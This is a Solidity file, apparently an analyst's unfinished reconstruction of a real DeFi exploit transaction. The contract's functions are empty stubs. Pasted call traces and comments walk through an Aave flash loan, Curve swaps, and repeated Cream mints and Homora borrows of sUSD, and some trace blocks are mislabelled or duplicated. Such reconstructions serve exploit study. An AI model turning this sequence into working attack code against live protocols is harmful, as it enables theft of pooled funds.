pragma solidity 0.8;

// https://tx.eth.samczsun.com/ethereum/0xacec6ddb7db4baa66c0fb6289c25a833d93d2d9eb4fbe9a8d8495e5bfa24ba57

contract Attack10 {

     /*
        {
          "[FUNCTION]": "execute",
          "[OPCODE]": "DELEGATECALL",
          "from": {
            "address": "0x5f5cd91070960d13ee549c9cc47e7a4cd00457bb",
            "balance": "0"
          },
          "to": {
            "address": "0x33bf0bb8e1405dc440eccb97ffd92fef438c8a27",
            "balance": "0"
          },
          "caller": {
            "address": "0x905315602ed9a854e325f692ff82f58799beab57",
            "balance": "1718532844200000000"
          },
          "input": {
            "positionId": "0",
            "spell": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
            "data": "0x7c2c889b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000009184e72a000"
          },
          "output": {
            "0": "888"
          },
          "gas": {
            "gas_left": 3251538,
            "gas_used": 2136792,
            "total_gas_used": 76690
          }
        }
    */
    // Execute the action via HomoraCaster, calling its function with the supplied data.
    function execute( uint positionId,address spell,bytes memory data) external payable lock onlyEOA returns (uint) {

        // HomoraCaster(caster).cast{value: msg.value}(spell, data);

        return 888;
    }

    /*
    {
      "[OPCODE]": "CALL",
      "from": {
        "address": "0x485758bd1ee9c3b79d962e2b1b4dc2f14aabba06",
        "balance": "0"
      },
      "to": {
        "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
        "balance": "1496925883045275"
      },
      "value": "0",
      "[INPUT]": "0x7c2c889b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000009184e72a000",
      "[OUTPUT]": "0x0000000000000000000000000000000000000000000000000000000000000001",
      "gas": {
        "gas_left": 3104050,
        "gas_used": 2082347,
        "total_gas_used": 224178
      }
    }
    */
    function callBad() public {
    }

    /*
    {
      "[FUNCTION]": "flashLoan",
      "[OPCODE]": "CALL",
      "from": {
        "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
        "balance": "1496925883045275"
      },
      "to": {
        "address": "0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9",
        "balance": "0"
      },
      "value": "0",
      "input": {
        "receiverAddress": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
        "assets": [
          "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
        ],
        "amounts": [
          "10000000000000"
        ],
        "modes": [
          "0"
        ],
        "onBehalfOf": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
        "params": "0x",
        "referralCode": 0
      },
      "[OUTPUT]": "0x",
      "gas": {
        "gas_left": 3047158,
        "gas_used": 2073695,
        "total_gas_used": 281070
      }
    }
    */
    // attacker flashloan aave
    // [Aave: Lending Pool V2].flashLoan(receiverAddress=[hacker contract], assets=[[Centre: USD Coin]], amounts=[10000000000000], modes=[0], onBehalfOf=[hacker contract], params=0x, referralCode=0)
    function flashloan() public {
        // [Aave: aUSDC Token V2].transferUnderlyingTo(target=[hacker contract], amount=10000000000000) → (10000000000000)
        // [hacker contract].executeOperation(arg0=[[Centre: USD Coin]], arg1=[10000000000000], arg2=[9000000000], arg3=[hacker contract], arg4=0x)
          /*
            {
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0xa5407eae9ba41422680e2e00537571bcc53efbfd",
                "balance": "0"
              },
              "value": "0",
              "[INPUT]": "0x3df0212400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000009184e72a0000000000000000000000000000000000000000000000000000000000000000000",
              "[OUTPUT]": "0x",
              "gas": {
                "gas_left": 2867628,
                "gas_used": 193019,
                "total_gas_used": 460600
              }
            }
          */
          // [Curve.fi: sUSD v2 Swap].exchange(i=1, j=3, dx=10000000000000, min_dy=0)

          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
                "balance": "0"
              },
              "input": {
                "account": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2"
              },
              "output": {
                "0": "9689298724170490767391241"
              },
              "gas": {
                "gas_left": 2676077,
                "gas_used": 6946,
                "total_gas_used": 652151
              }
            }
          */
          // [Synthetix: Proxy sUSD Token].balanceOf(owner=[hacker contract]) → (9689298724170490767391241)

          /*
            {
              "[FUNCTION]": "mint",
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8",
                "balance": "0"
              },
              "value": "0",
              "input": {
                "mintAmount": "9689298724170490767391241"
              },
              "output": {
                "0": "0x"
              },
              "gas": {
                "gas_left": 2667620,
                "gas_used": 239525,
                "total_gas_used": 660608
              }
            }
          */
          // [Cream.Finance: cySUSD Token].mint(mintAmount=9689298724170490767391241) → (0)

          /*
            {
              "[FUNCTION]": "mint",
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8",
                "balance": "0"
              },
              "value": "0",
              "input": {
                "mintAmount": "9689298724170490767391241"
              },
              "output": {
                "0": "0x"
              },
              "gas": {
                "gas_left": 2667620,
                "gas_used": 239525,
                "total_gas_used": 660608
              }
            }
          */
          // [TransparentUpgradeableProxy].getBankInfo(token=[Synthetix: Proxy sUSD Token]) → (isListed=true, cToken=[Cream.Finance: cySUSD Token], reserve=19709787742196, totalDebt=41710167951758009723104063, totalShare=1)
          
          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
                "balance": "0"
              },
              "input": {
                "account": "0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8"
              },
              "output": {
                "0": "9689298724170490767391241"
              },
              "gas": {
                "gas_left": 2421143,
                "gas_used": 6946,
                "total_gas_used": 907085
              }
            }
          */
          // Synthetix: Proxy sUSD Token].balanceOf(owner=[Cream.Finance: cySUSD Token]) → (9689298724170490767391241)

          /*
            {
              "[FUNCTION]": "fallback",
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x5f5cd91070960d13ee549c9cc47e7a4cd00457bb",
                "balance": "0"
              },
              "value": "0",
              "[INPUT]": "0x4b8a352900000000000000000000000057ab1ec28d129707052df4df418d58a2d46d5f510000000000000000000000000000000000000000000803c9efb358412b0aba09",
              "[OUTPUT]": "0x",
              "gas": {
                "gas_left": 2412621,
                "gas_used": 539077,
                "total_gas_used": 915607
              }
            }
          */
          // [TransparentUpgradeableProxy].borrow(token=[Synthetix: Proxy sUSD Token], amount=9689298724170490767391241) → ()
          
          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
                "balance": "0"
              },
              "input": {
                "account": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2"
              },
              "output": {
                "0": "9689298724170490767391241"
              },
              "gas": {
                "gas_left": 1879548,
                "gas_used": 6946,
                "total_gas_used": 1448680
              }
            }
          */
          // [Synthetix: Proxy sUSD Token].balanceOf(owner=[hacker contract]) → (9689298724170490767391241)
          
          /*
            {
              "[FUNCTION]": "mint",
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8",
                "balance": "0"
              },
              "value": "0",
              "input": {
                "mintAmount": "9689298724170490767391241"
              },
              "output": {
                "0": "0x"
              },
              "gas": {
                "gas_left": 1871111,
                "gas_used": 173679,
                "total_gas_used": 1457117
              }
            }
          */
          // [Cream.Finance: cySUSD Token].mint(mintAmount=9689298724170490767391241) → (0)
          
          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
                "balance": "0"
              },
              "input": {
                "account": "0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8"
              },
              "output": {
                "0": "9689298724170490767391241"
              },
              "gas": {
                "gas_left": 1697634,
                "gas_used": 6946,
                "total_gas_used": 1630594
              }
            }
          */
          // [Synthetix: Proxy sUSD Token].balanceOf(owner=[Cream.Finance: cySUSD Token]) → (9689298724170490767391241)
          
          /*
            {
              "[FUNCTION]": "fallback",
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x5f5cd91070960d13ee549c9cc47e7a4cd00457bb",
                "balance": "0"
              },
              "value": "0",
              "[INPUT]": "0x4b8a352900000000000000000000000057ab1ec28d129707052df4df418d58a2d46d5f510000000000000000000000000000000000000000000803c9efb358412b0aba09",
              "[OUTPUT]": "0x",
              "gas": {
                "gas_left": 1689112,
                "gas_used": 512389,
                "total_gas_used": 1639116
              }
            }
          */
          // [TransparentUpgradeableProxy].borrow(token=[Synthetix: Proxy sUSD Token], amount=9689298724170490767391241) → ()
          
          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
                "balance": "0"
              },
              "input": {
                "account": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2"
              },
              "output": {
                "0": "9689298724170490767391241"
              },
              "gas": {
                "gas_left": 1181468,
                "gas_used": 6946,
                "total_gas_used": 2146760
              }
            }
          */
          // [Synthetix: Proxy sUSD Token].balanceOf(owner=[hacker contract]) → (9689298724170490767391241)
          
          /*
            {
              "[OPCODE]": "CALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0xa5407eae9ba41422680e2e00537571bcc53efbfd",
                "balance": "0"
              },
              "value": "0",
              "[INPUT]": "0x3df02124000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000803c9efb358412b0aba090000000000000000000000000000000000000000000000000000000000000000",
              "[OUTPUT]": "0x",
              "gas": {
                "gas_left": 1172936,
                "gas_used": 154802,
                "total_gas_used": 2155292
              }
            }
          */
          // [Curve.fi: sUSD v2 Swap].exchange(i=3, j=1, dx=9689298724170490767391241, min_dy=0) → ()
          
          /*
            {
              "[FUNCTION]": "balanceOf",
              "[OPCODE]": "STATICCALL",
              "from": {
                "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
                "balance": "1496925883045275"
              },
              "to": {
                "address": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
                "balance": "0"
              },
              "input": {
                "account": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2"
              },
              "[OUTPUT]": "0x00000000000000000000000000000000000000000000000000000975cda77235",
              "gas": {
                "gas_left": 1019009,
                "gas_used": 3993,
                "total_gas_used": 2309219
              }
            }
          */
          // [Centre: USD Coin].balanceOf(account=[hacker contract]) → (10401566126645)
        
        /*
          {
            "[FUNCTION]": "scaledTotalSupply",
            "[OPCODE]": "DELEGATECALL",
            "from": {
              "address": "0x619beb58998ed2278e08620f97007e1116d5d25b",
              "balance": "0"
            },
            "to": {
              "address": "0xa0e7a1cd95978789e7da249b9211f826fb3bbc82",
              "balance": "0"
            },
            "caller": {
              "address": "0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9",
              "balance": "0"
            },
            "[INPUT]": "0xb1bf962d",
            "output": {
              "0": "77701952000187"
            },
            "gas": {
              "gas_left": 1038414,
              "gas_used": 1055,
              "total_gas_used": 2289814
            }
          }
        */
        // [Aave: USDC Variable Debt V2].scaledTotalSupply() → (77701952000187)
        
        /*
        ? 
        */
        // [Aave: USDC Stable Debt V2].getSupplyData() → (66886382103803, 66886383855066, 103212008129158995559752489, 1613196847)
        
        /*
          {
            "[FUNCTION]": "mintToTreasury",
            "[OPCODE]": "CALL",
            "from": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf",
              "balance": "0"
            },
            "to": {
              "address": "0xbcca60bb61934080951369a648fb03df4f96263c",
              "balance": "0"
            },
            "value": "0",
            "input": {
              "amount": "567359",
              "index": "1017682723778534322966771221"
            },
            "[OUTPUT]": "0x",
            "gas": {
              "gas_left": 1017270,
              "gas_used": 18356,
              "total_gas_used": 2310958
            }
          }
        */
        // [Aave: aUSDC Token V2].mintToTreasury(amount=567359, index=1017682723778534322966771221) → ()
        
        /*
          {
            "[OPCODE]": "STATICCALL",
            "from": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf",
              "balance": "0"
            },
            "to": {
              "address": "0xbcca60bb61934080951369a648fb03df4f96263c",
              "balance": "0"
            },
            "[INPUT]": "0x18160ddd",
            "[OUTPUT]": "0x000000000000000000000000000000000000000000000000000090351d4e8a3c",
            "gas": {
              "gas_left": 997626,
              "gas_used": 9096,
              "total_gas_used": 2330602
            }
          }
        */
        // [Aave: aUSDC Token V2].totalSupply() → (158557799352892)
        

        /*
          {
            "[FUNCTION]": "getTotalSupplyAndAvgRate",
            "[OPCODE]": "DELEGATECALL",
            "from": {
              "address": "0xe4922afab0bbadd8ab2a88e0c79d884ad337fca6",
              "balance": "0"
            },
            "to": {
              "address": "0x3b2a77058a1eb4403a90b94585fab16bc512e703",
              "balance": "0"
            },
            "caller": {
              "address": "0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9",
              "balance": "0"
            },
            "[INPUT]": "0xf731e9be",
            "output": {
              "0": "66886383855066",
              "1": "103212008129158995559752489"
            },
            "gas": {
              "gas_left": 964953,
              "gas_used": 5024,
              "total_gas_used": 2363275
            }
          }
        */
        // [Aave: USDC Stable Debt V2].getTotalSupplyAndAvgRate() → (66886383855066, 103212008129158995559752489)
        
        /*
          {
            "[OPCODE]": "STATICCALL",
            "from": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf",
              "balance": "0"
            },
            "to": {
              "address": "0x619beb58998ed2278e08620f97007e1116d5d25b",
              "balance": "0"
            },
            "[INPUT]": "0xb1bf962d",
            "[OUTPUT]": "0x000000000000000000000000000000000000000000000000000046ab653f50bb",
            "local_variables": {
              "vars": {
                "stableDebtTokenAddress": "0xe4922afab0bbadd8ab2a88e0c79d884ad337fca6",
                "availableLiquidity": "0",
                "totalStableDebt": "66886383855066",
                "newLiquidityRate": "0",
                "newStableRate": "0",
                "newVariableRate": "0",
                "avgStableRate": "103212008129158995559752489",
                "totalVariableDebt": "0"
              }
            },
            "gas": {
              "gas_left": 971934,
              "gas_used": 2963,
              "total_gas_used": 2356294
            }
          }
        */
        // [Aave: USDC Variable Debt V2].scaledTotalSupply() → (77701952000187)
        
        /*
          {
            "[FUNCTION]": "balanceOf",
            "[OPCODE]": "STATICCALL",
            "from": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf",
              "balance": "0"
            },
            "to": {
              "address": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
              "balance": "0"
            },
            "input": {
              "account": "0xbcca60bb61934080951369a648fb03df4f96263c"
            },
            "[OUTPUT]": "0x000000000000000000000000000000000000000000000000000001a2776facfe",
            "gas": {
              "gas_left": 967023,
              "gas_used": 3993,
              "total_gas_used": 2361205
            }
          }
        */
        // [Centre: USD Coin].balanceOf(account=[Aave: aUSDC Token V2]) → (1797300137214)
        
        /*
          {
            "[FUNCTION]": "calculateInterestRates",
            "[OPCODE]": "STATICCALL",
            "from": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf",
              "balance": "0"
            },
            "to": {
              "address": "0x8cae0596bc1ed42dc3f04c4506cfe442b3e74e27",
              "balance": "0"
            },
            "input": {
              "reserve": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
              "availableLiquidity": "11806300137214",
              "totalStableDebt": "66886383855066",
              "totalVariableDebt": "79874117268478",
              "averageStableBorrowRate": "103212008129158995559752489",
              "reserveFactor": "1000"
            },
            "output": {
              "0": "126798959481367966018240173",
              "1": "243262093577876260509412320",
              "2": "193262093577876260509412320"
            },
            "gas": {
              "gas_left": 959316,
              "gas_used": 10552,
              "total_gas_used": 2368912
            }
          }
        */
        // [Aave: USDC Interest Rate Strategy V2].calculateInterestRates(reserve=[Centre: USD Coin], availableLiquidity=11806300137214, totalStableDebt=66886383855066, totalVariableDebt=79874117268478, averageStableBorrowRate=103212008129158995559752489, reserveFactor=1000) → (126798959481367966018240173, 243262093577876260509412320, 193262093577876260509412320)
        
        /*
          {
            "[FUNCTION]": "safeTransferFrom",
            "[OPCODE]": "JUMP",
            "contract": {
              "address": "0xc6845a5c768bf8d7681249f8927877efda425baf"
            },
            "caller": {
              "address": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
              "balance": "1496925883045275"
            },
            "input": {
              "token": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
              "from": "0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2",
              "to": "0xbcca60bb61934080951369a648fb03df4f96263c",
              "value": "10009000000000"
            },
            "output": {},
            "gas": {
              "gas_left": 952230,
              "gas_used": 23323,
              "total_gas_used": 2375998
            }
          }
        */
        // [Centre: USD Coin].transferFrom(sender=[hacker contract], recipient=[Aave: aUSDC Token V2], amount=10009000000000)
    }
}